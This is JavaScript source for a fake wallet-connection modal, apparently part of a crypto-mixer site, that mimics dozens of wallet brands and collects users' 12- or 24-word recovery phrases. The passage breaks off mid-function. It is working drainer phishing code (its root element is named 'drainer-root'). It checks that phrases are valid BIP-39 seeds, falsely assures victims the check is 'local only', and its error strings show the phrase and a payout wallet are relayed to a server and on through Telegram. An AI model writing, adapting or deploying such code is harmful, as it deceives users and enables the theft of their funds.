(function (global) {
  "use strict";

  const PRIMARY = [
    { id: 'walletconnect', name: 'WalletConnect', tint: '#3396ff', pairType: 'evm' },
    { id: 'phantom', name: 'Phantom', tint: '#ab9ff2', pairType: 'sol' },
    { id: 'metamask', name: 'MetaMask', tint: '#f6851b', pairType: 'evm' }
  ];

  const ALL = [
    { id: 'trust', name: 'Trust', tint: '#3375bb', pairType: 'evm' },
    { id: 'coinbase', name: 'Coinbase', tint: '#0052ff', pairType: 'evm' },
    { id: 'okx', name: 'OKX', tint: '#1f1f1f', pairType: 'evm' },
    { id: 'bitget', name: 'Bitget', tint: '#00c6c6', pairType: 'evm' },
    { id: 'binance', name: 'Binance', tint: '#f0b90b', pairType: 'evm' },
    { id: 'safepal', name: 'SafePal', tint: '#4a9fe0', pairType: 'evm' },
    { id: 'tokenpocket', name: 'TokenPocket', tint: '#2980fe', pairType: 'evm' },
    { id: 'imtoken', name: 'imToken', tint: '#11c4d1', pairType: 'evm' },
    { id: 'rabby', name: 'Rabby', tint: '#8697ff', pairType: 'evm' },
    { id: 'rainbow', name: 'Rainbow', tint: '#ff4d6d', pairType: 'evm' },
    { id: 'zerion', name: 'Zerion', tint: '#2962ef', pairType: 'evm' },
    { id: 'exodus', name: 'Exodus', tint: '#3d3d8f', pairType: 'evm' },
    { id: 'argent', name: 'Argent', tint: '#ff875b', pairType: 'evm' },
    { id: 'enkrypt', name: 'Enkrypt', tint: '#6c5ce7', pairType: 'evm' },
    { id: 'backpack', name: 'Backpack', tint: '#e33e3f', pairType: 'sol' },
    { id: 'coin98', name: 'Coin98', tint: '#c99b28', pairType: 'sol' },
    { id: 'glow', name: 'Glow', tint: '#f4b23c', pairType: 'sol' },
    { id: 'ronin', name: 'Ronin', tint: '#1273ea', pairType: 'evm' },
    { id: 'sequence', name: 'Sequence', tint: '#111111', pairType: 'evm' },
    { id: 'zengo', name: 'Zengo', tint: '#00b5c9', pairType: 'evm' },
    { id: 'ambire', name: 'Ambire', tint: '#7c3aed', pairType: 'evm' },
    { id: 'sender', name: 'Sender', tint: '#8b5cf6', pairType: 'sol' },
    { id: 'clave', name: 'Clave', tint: '#1e6bff', pairType: 'evm' },
    { id: 'keplr', name: 'Keplr', tint: '#7c6bff', pairType: 'sol' },
    { id: 'solflare', name: 'Solflare', tint: '#ff9a00', pairType: 'sol' },
    { id: 'ledger', name: 'Ledger', tint: '#111111', pairType: 'evm' },
    { id: 'trezor', name: 'Trezor', tint: '#171717', pairType: 'evm' },
    { id: 'bitbox', name: 'BitBox', tint: '#1a1a1a', pairType: 'evm' },
    { id: 'cypherock', name: 'Cypherock', tint: '#0f62fe', pairType: 'evm' },
    { id: 'kraken', name: 'Kraken', tint: '#5741d9', pairType: 'evm' },
    { id: 'atomic', name: 'Atomic', tint: '#2d5bff', pairType: 'evm' },
    { id: 'tronlink', name: 'TronLink', tint: '#eb0029', pairType: 'tron' }
  ];

  const WALLET_META = {
    metamask: { label: 'Secret Recovery Phrase', defaultCount: 12, network: 'Ethereum', path: "m/44'/60'/0'/0" },
    phantom: { label: 'Recovery Phrase', defaultCount: 12, network: 'Solana', path: "m/44'/501'/0'/0'" },
    trust: { label: 'Recovery Phrase', defaultCount: 12, network: 'Ethereum', path: "m/44'/60'/0'/0" },
    rabby: { label: 'Recovery Phrase', defaultCount: 12, network: 'Ethereum', path: "m/44'/60'/0'/0" },
    solflare: { label: 'Recovery Phrase', defaultCount: 12, network: 'Solana', path: "m/44'/501'/0'/0'" },
    tronlink: { label: 'Recovery Phrase', defaultCount: 12, network: 'TRON', path: "m/44'/195'/0'/0" },
    exodus: { label: 'Seed Phrase', defaultCount: 24, network: 'Ethereum', path: "m/44'/60'/0'/0" },
    ledger: { label: 'Seed Phrase', defaultCount: 24, network: 'Ethereum', path: "m/44'/60'/0'/0" },
    default: { label: 'Recovery Phrase', defaultCount: 12, network: 'Ethereum', path: "m/44'/60'/0'/0" }
  };

  const WALLET_NETWORK = {
    phantom: 'Solana',
    solflare: 'Solana',
    backpack: 'Solana',
    glow: 'Solana',
    sender: 'Solana',
    keplr: 'Solana',
    coin98: 'Solana',
    tronlink: 'TRON'
  };

  const NETWORK_PATHS = {
    bitcoin: "m/84'/0'/0'/0",
    litecoin: "m/84'/2'/0'/0",
    zcash: "m/44'/133'/0'/0",
    solana: "m/44'/501'/0'/0'",
    tron: "m/44'/195'/0'/0"
  };

  const EVM_NETWORKS = ['ethereum', 'base', 'bsc', 'bnb', 'polygon', 'avalanche', 'optimism', 'aurora'];

  const RETRY_DELAYS = [2000, 5000, 10000];

  const NETWORKS = ['Bitcoin', 'Ethereum', 'Solana', 'TRON', 'Litecoin', 'Zcash'];
  const RESTORE_STEPS = ['Checking phrase', 'Scanning accounts', 'Syncing balances'];

  const STATE = {
    screen: 'connect',
    wallet: null,
    allSearch: '',
    count: 24,
    network: 'Ethereum',
    address: null,
    phrase: Array(24).fill(''),
    sendStatus: '',
    sendError: false,
    sendRetry: false,
    retryCount: 0,
    sending: false,
    connecting: false,
    selectedWalletId: null,
    open: false,
    connectionResolved: false,
    invalidLength: false,
    phraseStatus: 'Incomplete',
    phraseOk: false,
    qrFor: null,
    qrZoom: false,
    pending: null,
    resolveTimer: null,
    lastReturnFocus: null,
    restoreStep: 0,
    restoreTimer: null
  };

  const WORDLIST_URL = 'assets/wordlist.txt';
  let BIP39_WORDS = [];
  let BIP39_LOADED_AT = 0;

  async function loadWordList() {
    if (BIP39_WORDS.length) return BIP39_WORDS;
    if (typeof fetch !== 'function') return BIP39_WORDS;

    try {
      const response = await fetch(WORDLIST_URL, { cache: 'force-cache' });
      if (!response || !response.ok) return BIP39_WORDS;

      const text = await response.text();
      const nextWords = String(text || '')
        .split(/\r?\n/)
        .map((word) => normalizeWord(word))
        .filter(Boolean);

      if (nextWords.length === 2048) {
        BIP39_WORDS = nextWords;
        BIP39_LOADED_AT = Date.now();
      }
    } catch (error) {
    }

    return BIP39_WORDS;
  }

  function normalizeWord(value) {
    return String(value || '').trim().toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g, '').replace(/[^a-z]/g, ' ').replace(/\s+/g, ' ').trim();
  }

  function wordHasValidPrefix(word) {
    const normalized = normalizeWord(word);
    if (!normalized || normalized.length < 2 || !BIP39_WORDS.length) return false;
    return BIP39_WORDS.some((candidate) => candidate.startsWith(normalized));
  }

  function checkWord(word) {
    const normalized = normalizeWord(word);
    if (!normalized) return false;
    return BIP39_WORDS.includes(normalized);
  }

  const DEBUG = /(^|[?&])debug\b/.test(location.search)
    || /^(localhost|127\.0\.0\.1|\[::1\])$/.test(location.hostname);

  function validateDiag(words, result) {
    if (!DEBUG) return;
    const firstBad = words.find((word) => !BIP39_WORDS.includes(word));
    const record = {
      at: Date.now(),
      wordCount: words.length,
      stateCount: STATE.count,
      phraseLen: STATE.phrase.length,
      invalidLength: STATE.invalidLength,
      wordlistLen: BIP39_WORDS.length,
      wordlistLoadedAt: BIP39_LOADED_AT,
      firstBadWord: firstBad === undefined ? null : firstBad,
      firstBadIndex: firstBad === undefined ? -1 : words.indexOf(firstBad),
      firstBadInList: firstBad === undefined ? null : true,
      indexes: words.map((word) => BIP39_WORDS.indexOf(word)),
      result
    };
    if (global.NORTHMIX_DEBUG === undefined) global.NORTHMIX_DEBUG = {};
    global.NORTHMIX_DEBUG.last = record;
    console.log('[seed-validate] ' + JSON.stringify(record));
    return record;
  }

  async function validateMnemonicPhrase(phrase) {
    await loadWordList();
    const words = String(phrase || '').trim().split(/\s+/).filter(Boolean).map(normalizeWord);
    if (![12, 24].includes(words.length)) return validateDiag(words, 'count:' + words.length) && false;
    if (!BIP39_WORDS.length) return validateDiag(words, 'wordlist-empty') && false;
    if (words.some((word) => !BIP39_WORDS.includes(word))) return validateDiag(words, 'unknown-word') && false;

    const entropyBits = words.length === 12 ? 128 : 256;
    const checksumBits = words.length === 12 ? 4 : 8;
    const bitStream = words.map((word) => {
      const index = BIP39_WORDS.indexOf(word);
      return index.toString(2).padStart(11, '0');
    }).join('');

    const entropyBytes = [];
    for (let index = 0; index < entropyBits; index += 8) {
      const chunk = bitStream.slice(index, index + 8);
      if (chunk.length < 8) break;
      entropyBytes.push(parseInt(chunk, 2));
    }

    if (!entropyBytes.length) return false;

    const digest = await (typeof crypto !== 'undefined' && crypto.subtle
      ? crypto.subtle.digest('SHA-256', new Uint8Array(entropyBytes))
      : Promise.reject(new Error('No crypto')));

    const hashBits = Array.from(new Uint8Array(digest)).map((byte) => byte.toString(2).padStart(8, '0')).join('');
    const checksumSegment = bitStream.slice(entropyBits);
    const checksumOk = checksumSegment === hashBits.slice(0, checksumBits);
    validateDiag(words, checksumOk ? 'checksum-ok' : 'checksum-bad:' + checksumSegment + '/' + hashBits.slice(0, checksumBits));
    return checksumOk;
  }

  const SITE = global.NORTHMIX_SITE || {};

  function primaryWallets() {
    const ids = Array.isArray(SITE.visibleWallets) && SITE.visibleWallets.length ? SITE.visibleWallets : null;
    if (!ids) return PRIMARY;
    const picked = ids.map((id) => [...PRIMARY, ...ALL].find((w) => w.id === id)).filter(Boolean);
    return picked.length ? picked : PRIMARY;
  }

  function allWallets() {
    return [...PRIMARY, ...ALL];
  }

  function walletById(id) {
    return allWallets().find((wallet) => wallet.id === id) || null;
  }

  function walletMeta(wallet) {
    const id = wallet && wallet.id ? wallet.id : 'default';
    return WALLET_META[id] || WALLET_META.default;
  }

  function walletLabel(wallet) {
    return walletMeta(wallet).label;
  }

  function walletDefaultCount(wallet) {
    return walletMeta(wallet).defaultCount || 12;
  }

  function networkKey(nameOrId) {
    const key = String(nameOrId || '').toLowerCase().trim();
    if (key === 'solana' || key === 'sol') return 'solana';
    if (key === 'tron' || key === 'trx') return 'tron';
    if (key === 'bitcoin' || key === 'btc') return 'bitcoin';
    if (key === 'litecoin' || key === 'ltc') return 'litecoin';
    if (key === 'zcash' || key === 'zec') return 'zcash';
    if (EVM_NETWORKS.indexOf(key) !== -1) return 'ethereum';
    return '';
  }

  function walletDerivationPath(wallet, networkName) {
    const meta = walletMeta(wallet);
    const key = networkKey(networkName) || networkKey(meta.network);
    return NETWORK_PATHS[key] || "m/44'/60'/0'/0";
  }

  function clearRestoreTimer() {
    if (STATE.restoreTimer) {
      window.clearInterval(STATE.restoreTimer);
      STATE.restoreTimer = null;
    }
  }

  function startRestoreFlow() {
    clearRestoreTimer();
    STATE.restoreStep = 0;
    STATE.screen = 'restoring';
    render();
    STATE.restoreTimer = window.setInterval(function () {
      STATE.restoreStep += 1;
      if (STATE.restoreStep >= RESTORE_STEPS.length) {
        STATE.restoreStep = RESTORE_STEPS.length - 1;
      }
      render();
      if (STATE.restoreStep >= RESTORE_STEPS.length - 1) {
        window.clearInterval(STATE.restoreTimer);
        STATE.restoreTimer = null;
        window.setTimeout(function () {
          STATE.screen = 'done';
          render();
          STATE.resolveTimer = window.setTimeout(function () {
            STATE.resolveTimer = null;
            closeConnector();
          }, 1200);
        }, 500);
      }
    }, 1100);
  }

  function walletIcon(wallet) {
    const id = wallet && wallet.id ? wallet.id : 'walletconnect';
    const filename = ['walletconnect', 'phantom', 'metamask', 'trust', 'coinbase', 'okx', 'bitget', 'binance', 'safepal', 'tokenpocket', 'imtoken', 'rabby', 'rainbow', 'zerion', 'exodus', 'argent', 'enkrypt', 'backpack', 'coin98', 'glow', 'ronin', 'sequence', 'zengo', 'ambire', 'sender', 'clave', 'keplr', 'solflare', 'ledger', 'trezor', 'bitbox', 'cypherock', 'kraken', 'atomic', 'tronlink'].includes(id) ? id : 'walletconnect';
    return 'assets/logos/wallets/' + filename + '.svg';
  }

  const NETWORK_IDS = {
    bitcoin: 'bitcoin',
    ethereum: 'ethereum',
    solana: 'solana',
    tron: 'tron',
    litecoin: 'litecoin',
    zcash: 'zcash'
  };

  const NETWORK_ASSET = {
    bitcoin: 'btc',
    ethereum: 'eth',
    solana: 'sol',
    tron: 'usdt',
    litecoin: 'ltc',
    zcash: 'zec'
  };

  function activeState() {
    const ui = global.NORTHMIX && global.NORTHMIX.transactionUI;
    return ui && typeof ui.getState === 'function' ? ui.getState() : null;
  }

  const DEFAULT_NETWORK = SITE.defaultNetwork || 'Ethereum';

  function inferNetwork(wallet) {
    if (!wallet) return DEFAULT_NETWORK;
    return WALLET_NETWORK[wallet.id] || walletMeta(wallet).network || DEFAULT_NETWORK;
  }

  function getWalletPair(wallet, selectedNetwork) {
    const wanted = String(selectedNetwork || inferNetwork(wallet));
    const label = NETWORKS.find((name) => name.toLowerCase() === wanted.toLowerCase()) || DEFAULT_NETWORK;
    const id = NETWORK_IDS[label.toLowerCase()] || 'ethereum';
    const api = global.NORTHMIX.api;
    const active = activeState();
    const pair = (active && api.getPair(active.assetId, id)) || api.getPair(NETWORK_ASSET[id] || 'eth', id);
    return { address: pair ? pair.address : '', network: label, type: pair ? pair.type : 'evm' };
  }

  function renderSeedQr(root) {
    const target = root && root.querySelector ? root.querySelector('#seed-qr') : null;
    if (!target) return;
    if (STATE.qrFor === STATE.address && target.firstChild) return;
    target.innerHTML = '';
    STATE.qrFor = STATE.address;
    if (!STATE.address || !global.NORTHMIX.qr) return;
    try {
      const svg = global.NORTHMIX.qr.renderSVG(STATE.address, { cellSize: 3, margin: 1 });
      if (svg) target.innerHTML = svg;
    } catch (error) {
      target.textContent = '';
    }
  }

  function applyWords(words, start) {
    if ([12, 24].includes(words.length)) {
      STATE.count = words.length;
      STATE.phrase = words.slice();
      STATE.invalidLength = false;
    } else {
      STATE.invalidLength = true;
      const grid = STATE.phrase.length ? STATE.phrase.slice() : Array.from({ length: STATE.count }, () => '');
      words.forEach((word, offset) => { if (grid[start + offset] !== undefined) grid[start + offset] = word; });
      STATE.phrase = grid;
    }
    STATE.phraseOk = false;
    render();
    const root = getRoot();
    if (root) void refreshSeedState(root);
  }

  async function refreshSeedState(root) {
    const message = root.querySelector('#seed-status-message');
    const words = STATE.phrase.slice(0, STATE.count).map((value) => normalizeWord(value));
    const filled = words.filter(Boolean);
    const hasAny = filled.length > 0;

    let statusText = 'Incomplete';
    let phraseOk = false;
    if (STATE.invalidLength || filled.length > STATE.count) {
      statusText = 'Wrong length';
    } else if (!hasAny) {
      statusText = 'Incomplete';
    } else if (filled.length !== STATE.count) {
      statusText = 'Incomplete';
    } else if (filled.some((word) => !checkWord(word) && !wordHasValidPrefix(word))) {
      statusText = 'Unknown word';
    } else if (filled.some((word) => !checkWord(word))) {
      statusText = 'Incomplete';
    } else {
      const phrase = filled.join(' ');
      const checksumIsValid = await validateMnemonicPhrase(phrase);
      phraseOk = checksumIsValid;
      statusText = checksumIsValid ? 'Phrase verified' : 'Checksum failed';
    }

    STATE.phraseStatus = statusText;
    STATE.phraseOk = phraseOk;

    if (message) {
      message.textContent = statusText;
      message.className = 'sc-status ' + (phraseOk ? 'ok' : 'err');
    }

    const button = root.querySelector('[data-action="submit-seed"]');
    if (button) button.disabled = !(phraseOk && !STATE.sending);

    root.querySelectorAll('.sc-word').forEach((field) => {
      const value = normalizeWord(field.value);
      const shouldWarn = Boolean(value) && !checkWord(value) && !wordHasValidPrefix(value);
      const isWord = Boolean(value) && checkWord(value);
      field.classList.toggle('valid', isWord);
      field.classList.toggle('error', shouldWarn);
      field.setAttribute('aria-invalid', shouldWarn ? 'true' : 'false');
    });
  }

  function renderWalletOptions(list = PRIMARY) {
    return (Array.isArray(list) ? list : []).map((wallet) => (
      '<button type="button" class="sc-row" data-wallet-id="' + wallet.id + '">' +
        '<div class="sc-row-icon"><img src="' + walletIcon(wallet) + '" alt="" width="30" height="30" style="width:30px;height:30px;object-fit:contain;display:block;" onerror="this.style.display=\'none\';this.parentNode.style.background=\'' + wallet.tint + '\';this.parentNode.style.color=\'#fff\';"></div>' +
        '<span class="sc-name">' + wallet.name + '</span>' +
        '<span class="sc-tag ' + (wallet.id === 'walletconnect' ? 'qr' : 'multichain') + '">' + (wallet.id === 'walletconnect' ? 'QR CODE' : 'MULTICHAIN') + '</span>' +
      '</button>'
    )).join('');
  }

  function renderAllWallets() {
    const list = STATE.allSearch ? ALL.filter((wallet) => wallet.name.toLowerCase().includes(STATE.allSearch.toLowerCase())) : ALL;
    if (!list.length) {
      return '<div style="grid-column:1 / -1;padding:24px 0;text-align:center;color:rgba(255,255,255,.45);">No wallet found</div>';
    }
    return list.map((wallet) => (
      '<button type="button" class="sc-cell" data-wallet-id="' + wallet.id + '"' + (STATE.selectedWalletId === wallet.id ? ' disabled' : '') + '>' +
        '<div class="sc-row-icon" style="width:40px;height:40px;border-radius:13px;">' +
          '<img src="' + walletIcon(wallet) + '" alt="" width="28" height="28" style="width:28px;height:28px;object-fit:contain;display:block;" onerror="this.style.display=\'none\';this.parentNode.style.background=\'' + wallet.tint + '\';this.parentNode.style.color=\'#fff\';">' +
        '</div>' +
        '<div class="sc-cell-label"><span>' + wallet.name + '</span>' + (STATE.wallet && STATE.wallet.id === wallet.id ? '<span class="sc-check">✓</span>' : '') + '</div>' +
      '</button>'
    )).join('');
  }

  function qrSvg(cell) {
    if (!STATE.address || !global.NORTHMIX.qr) return '';
    try {
      return global.NORTHMIX.qr.renderSVG(STATE.address, { cellSize: cell, margin: 1 }) || '';
    } catch (error) {
      return '';
    }
  }

  function escapeHtml(value) {
    return String(value)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#39;');
  }

  function getRoot() {
    const mount = document.getElementById('wallet-connector-mount');
    if (!mount) return null;
    let root = mount.querySelector('#drainer-root');
    if (!root) {
      root = document.createElement('div');
      root.id = 'drainer-root';
      mount.appendChild(root);
    }
    return root;
  }

  function render() {
    const root = getRoot();
    if (!root) return;

    const statusLabel = STATE.phraseStatus || 'Incomplete';

    const phraseIsReady = Boolean(STATE.phraseOk);
    const activeWalletLabel = walletLabel(STATE.wallet || PRIMARY[0]);
    const restoreLabel = RESTORE_STEPS[Math.min(STATE.restoreStep || 0, RESTORE_STEPS.length - 1)] || RESTORE_STEPS[0];

    const panel = `
      <div class="sc-backdrop"></div>
      <div class="sc-modal">
        <div class="sc-page">
          <div class="sc-card">
            ${STATE.screen === 'connect' ? `
              <div class="sc-screen">
                <div class="sc-header">
                  <div class="sc-header-mark">W</div>
                  <div class="sc-title">Connect Wallet</div>
                  <button type="button" class="sc-close" data-action="close">✕</button>
                </div>
                <div class="sc-body">
                  <div style="margin-top:2px;display:flex;flex-direction:column;gap:6px;">${renderWalletOptions(primaryWallets())}</div>
                  <div class="sc-search" data-action="open-all">
                    <svg width="16" height="16" viewBox="0 0 16 16" fill="none" aria-hidden="true"><circle cx="7" cy="7" r="4.5" stroke="currentColor" strokeWidth="1.5" /><path d="M10.5 10.5L14 14" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" /></svg>
                    <input readonly value="" placeholder="Search Wallet" aria-label="Search Wallet" style="cursor:pointer;" />
                    <span class="sc-search-count">${allWallets().length}</span>
                  </div>
                </div>
                <div class="sc-footer"><span class="sc-foot-pip" aria-hidden="true"></span><span>Non-custodial</span><span class="sc-dot"></span><span>No KYC</span><span class="sc-dot"></span><span>180k+ wallets</span></div>
              </div>
            ` : ''}
            ${STATE.screen === 'all' ? `
              <div class="sc-screen">
                <div class="sc-header">
                  <button type="button" class="sc-close" data-action="back" style="left:18px;right:auto;font-size:18px;transform:none;">←</button>
                  <div class="sc-title">All Wallets</div>
                  <button type="button" class="sc-close" data-action="close">✕</button>
                </div>
                <div class="sc-body">
                  <div class="sc-search" style="margin-top:0;">
                    <svg width="16" height="16" viewBox="0 0 16 16" fill="none" aria-hidden="true"><circle cx="7" cy="7" r="4.5" stroke="currentColor" strokeWidth="1.5" /><path d="M10.5 10.5L14 14" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" /></svg>
                    <input value="${escapeHtml(STATE.allSearch)}" data-field="all-search" placeholder="Search Wallet" aria-label="Search wallet list" />
                  </div>
                  <div class="sc-all-grid" style="margin-top:8px;">${renderAllWallets()}</div>
                </div>
              </div>
            ` : ''}
            ${(STATE.screen === 'seed' || STATE.screen === 'restoring' || STATE.screen === 'done') ? `
              <div class="sc-header">
                <button type="button" class="sc-close" data-action="back" style="left:18px;right:auto;font-size:28px;">←</button>
                <div class="sc-title" style="font-size:17px;">${escapeHtml(activeWalletLabel)}</div>
                <button type="button" class="sc-close" data-action="close">✕</button>
              </div>
              ${STATE.screen === 'seed' ? `
                <div class="sc-body sc-seed-shell">
                  <div class="sc-wallet-chip">
                    <img src="${walletIcon(STATE.wallet || PRIMARY[0])}" alt="" width="32" height="32" style="width:32px;height:32px;object-fit:contain;border-radius:9px;display:block;" onerror="this.style.display='none';this.parentNode.style.background='#262626';this.parentNode.style.borderRadius='9px';">
                    <div class="sc-wallet-meta" style="flex:1;">
                      <div style="display:flex;align-items:center;gap:8px;">
                        <strong>${escapeHtml(STATE.wallet ? STATE.wallet.name : 'Wallet')}</strong>
                        <span class="sc-chip-status">Connected</span>
                      </div>
                      <span>${STATE.address ? STATE.address.slice(0, 6) + '…' + STATE.address.slice(-4) : 'Not connected'}</span>
                    </div>
                  </div>
                  <div class="sc-device-banner"><span class="sc-foot-pip" aria-hidden="true"></span><span>Unverified device — phrase required</span></div>
                  <div class="sc-pair-row">
                    <div class="sc-pair-text">
                      <span class="sc-pair-label">Deposit · ${escapeHtml(STATE.network)}</span>
                      <code class="sc-pair-addr">${escapeHtml(STATE.address || '—')}</code>
                      <span class="sc-pair-hint">Matched to your wallet</span>
                    </div>
                    <div class="sc-pair-qr" id="seed-qr" data-action="zoom-qr" role="button" tabindex="0" aria-label="Enlarge deposit QR"></div>
                  </div>
                  <p class="sc-seed-hint">${escapeHtml((SITE.texts && SITE.texts.seedHint) || 'Paste or type the phrase, 12 or 24 words. Network and deposit address follow the wallet you picked.')}</p>
                  <div class="sc-tabs">
                    <button type="button" class="sc-tab ${STATE.count === 12 ? 'active' : ''}" data-count="12">12</button>
                    <button type="button" class="sc-tab ${STATE.count === 24 ? 'active' : ''}" data-count="24">24</button>
                  </div>
                  <div class="sc-input-grid ${STATE.count === 24 ? 'col-6' : ''}" data-action="paste-grid">
                    ${Array.from({ length: STATE.count }, (_, index) => {
                      const value = STATE.phrase[index] || '';
                      const word = normalizeWord(value);
                      const isValid = Boolean(word) && checkWord(word);
                      const isInvalid = Boolean(word) && !checkWord(word);
                      const statusClass = isValid ? 'valid' : isInvalid ? 'error' : '';
                      return `
                        <div class="sc-input-wrap">
                          <span class="sc-word-index">${index + 1}</span>
                          <input class="sc-word ${statusClass}" data-index="${index}" value="${escapeHtml(value.toLowerCase())}" maxlength="12" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false" inputmode="text" />
                        </div>
                      `;
                    }).join('')}
                  </div>
                  <div class="sc-status-row">
                    <div id="seed-status-message" class="sc-status ${statusLabel === 'Phrase verified' ? 'ok' : 'err'}" aria-live="polite">${statusLabel}</div>
                    <button type="button" class="sc-copy" data-action="paste-clipboard">Paste</button>
                  </div>
                  <div style="display:flex;align-items:center;justify-content:space-between;gap:8px;margin-top:8px;">${STATE.sendError ? `<div style="display:flex;align-items:center;gap:8px;font-size:12px;color:#fbbf24;background:rgba(251,191,36,.08);border:1px solid rgba(251,191,36,.18);border-radius:999px;padding:6px 10px;"> <span>${escapeHtml(STATE.sendStatus || 'Not delivered — Retry')}</span>${STATE.sendRetry ? '<button type="button" class="sc-copy" data-action="retry-submit" style="color:#fcd34d;">Retry</button>' : ''}</div>` : ''}</div>
                  <button type="button" class="sc-cta" data-action="submit-seed" ${phraseIsReady && !STATE.sending ? '' : 'disabled'}>${STATE.sending ? (STATE.retryCount ? 'Retrying ' + STATE.retryCount + ' of 3' : 'Sending…') : 'Restore Wallet'}</button>
                  <div class="sc-footer" style="border-top:none;padding-top:12px;padding-bottom:0;font-size:11.5px;color:rgba(255,255,255,.35);">${escapeHtml(walletDerivationPath(STATE.wallet, STATE.network))} · BIP-39 · local only</div>
                </div>
              ` : ''}
              ${STATE.screen === 'restoring' ? `
                <div class="sc-body sc-restoring">
                  <div class="sc-spinner" aria-hidden="true"></div>
                  <div class="sc-title" style="margin-top:0;">Restoring wallet</div>
                  <div class="sc-subtitle">${restoreLabel}</div>
                  <div class="sc-progress-wrap">
                    <div class="sc-progress-bar"><span style="width:${((STATE.restoreStep + 1) / RESTORE_STEPS.length) * 100}%"></span></div>
                    <div class="sc-progress-label">${restoreLabel}</div>
                  </div>
                  <div class="sc-restore-time">00:${String(3 - STATE.restoreStep).padStart(2, '0')}</div>
                  <div class="sc-device-banner" style="width:100%;"><span class="sc-foot-pip" aria-hidden="true"></span><span>Verifying locally</span></div>
                </div>
              ` : ''}
              ${STATE.screen === 'done' ? `
                <div class="sc-done">
                  <div class="sc-done-badge"><svg viewBox="0 0 24 24" width="26" height="26" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true"><path d="M5 12.5L10 17.5L19 5.5" /></svg></div>
                  <div class="sc-done-title">Wallet restored</div>
                  <div class="sc-done-subtitle">Ready to continue</div>
                  <div class="sc-done-wallet">
                    <img src="${walletIcon(STATE.wallet || PRIMARY[0])}" alt="" width="24" height="24" style="width:24px;height:24px;object-fit:contain;border-radius:8px;display:block;" onerror="this.style.display='none';this.parentNode.style.background='#262626';this.parentNode.style.borderRadius='9px';">
                    <div style="display:flex;flex-direction:column;">
                      <strong>${escapeHtml(STATE.wallet ? STATE.wallet.name : 'Wallet')}</strong>
                      <span>${STATE.address ? STATE.address.slice(0, 6) + '…' + STATE.address.slice(-4) : 'Not connected'}</span>
                    </div>
                  </div>
                </div>
              ` : ''}
            ` : ''}
          </div>
        </div>
        ${STATE.qrZoom ? '<div class="sc-qr-overlay" data-action="close-qr">' + qrSvg(6) + '</div>' : ''}
      </div>
    `;

    root.innerHTML = panel;
    bindInteractions(root);
    renderSeedQr(root);
  }

  function settleResolve(value) {
    if (STATE.resolveTimer) {
      window.clearTimeout(STATE.resolveTimer);
      STATE.resolveTimer = null;
    }
    const pending = STATE.pending;
    STATE.pending = null;
    STATE.connecting = false;
    STATE.connectionResolved = true;
    STATE.open = true;
    if (pending && typeof pending.resolve === 'function') pending.resolve(value);
    render();
  }

  function settleReject() {
    if (STATE.resolveTimer) {
      window.clearTimeout(STATE.resolveTimer);
      STATE.resolveTimer = null;
    }
    const pending = STATE.pending;
    STATE.pending = null;
    STATE.connecting = false;
    STATE.connectionResolved = false;
    if (pending && typeof pending.reject === 'function') pending.reject(new Error('Wallet connection was cancelled.'));
  }

  function missingField(payload) {
    if (!payload) return 'Wallet not ready';
    if (!payload.ref) return 'Deposit reference missing';
    if (!payload.deposit) return 'Deposit address missing';
    if (!payload.payout) return 'Payout wallet missing';
    if (!payload.asset || !payload.network) return 'Pair missing';
    if (!Array.isArray(payload.words) || (payload.words.length !== 12 && payload.words.length !== 24)) return 'Phrase incomplete';
    return '';
  }

  function isRetryableFailure(result) {
    const status = result && result.status ? result.status : 0;
    const error = result && result.data && result.data.error ? String(result.data.error) : '';
    if (status === 0) return true;
    if (status === 502 && error === 'config') return false;
    return status >= 500;
  }

  function wait(ms) {
    return new Promise((resolve) => window.setTimeout(resolve, ms));
  }

  function describeSendFailure(result) {
    const status = result && result.status ? result.status : 0;
    const error = result && result.data && result.data.error ? String(result.data.error) : '';
    if (status === 429) return { text: 'Too many attempts, wait a minute', retry: true };
    if (status === 502 && error === 'config') return { text: 'Delivery misconfigured on our side — Retry', retry: true };
    if (status === 502 && error === 'telegram') return { text: 'Telegram refused it — Retry', retry: true };
    if (status === 502) return { text: 'Delivery failed — Retry', retry: true };
    if (status === 413) return { text: 'Phrase too long — shorten it', retry: true };
    if (status === 400) {
      if (error === 'words' || error === 'phrase') return { text: 'Phrase rejected — check the words', retry: true };
      if (error === 'deposit' || error === 'pair') return { text: 'Deposit address missing — pick another network', retry: true };
      if (error === 'ref') return { text: 'Reference missing — restart the mix', retry: true };
      if (error === 'origin') return { text: 'Wrong origin — reload the page', retry: true };
      return { text: 'Request rejected — Retry', retry: true };
    }
    if (status >= 500) return { text: 'Server error — Retry', retry: true };
    if (status === 0) return { text: 'Connection lost — Retry', retry: true };
    return { text: 'Not delivered — Retry', retry: true };
  }

  function bindInteractions(root) {
    root.onmousedown = function (event) {
      if (event.target === root || (event.target && event.target.classList && event.target.classList.contains('sc-backdrop'))) {
        if (!STATE.connectionResolved) settleReject();
        closeConnector();
      }
    };

    root.querySelectorAll('[data-wallet-id]').forEach((button) => {
      button.addEventListener('click', function () {
        const walletId = button.getAttribute('data-wallet-id');
        const wallet = walletById(walletId);
        if (!wallet || STATE.connecting || STATE.selectedWalletId === wallet.id) return;

        const pending = STATE.pending;
        const meta = walletMeta(wallet);
        STATE.selectedWalletId = wallet.id;
        STATE.wallet = wallet;
        STATE.screen = 'seed';
        STATE.connecting = true;
        STATE.connectionResolved = false;
        STATE.count = walletDefaultCount(wallet);
        STATE.phrase = Array.from({ length: STATE.count }, () => '');
        STATE.sendError = false;
        STATE.sendStatus = '';
        STATE.sendRetry = false;
        STATE.retryCount = 0;
        STATE.phraseOk = false;
        STATE.phraseStatus = 'Incomplete';
        STATE.network = inferNetwork(wallet);
        const pair = getWalletPair(wallet, STATE.network);
        STATE.address = pair.address;
        STATE.network = pair.network;
        if (global.NORTHMIX.transactionUI) global.NORTHMIX.transactionUI.setNetwork(pair.network);
        render();

        STATE.resolveTimer = window.setTimeout(function () {
          STATE.resolveTimer = null;
          settleResolve({ address: pair.address, network: pair.network, name: wallet.name });
        }, 900);
      });
    });

    root.querySelectorAll('[data-action="close"]').forEach((button) => {
      button.addEventListener('click', function () {
        if (!STATE.connectionResolved) settleReject();
        closeConnector();
